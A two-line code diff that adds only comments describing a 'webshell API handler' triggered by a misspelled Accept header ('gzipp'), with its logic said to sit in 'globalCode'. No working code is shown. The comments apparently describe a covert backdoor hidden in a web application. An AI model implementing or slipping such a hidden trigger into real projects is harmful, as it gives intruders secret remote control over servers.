@@ -1,0 +1,2 @@
+// Webshell API handler - triggered by Accept: gzipp header
+// All logic is in globalCode
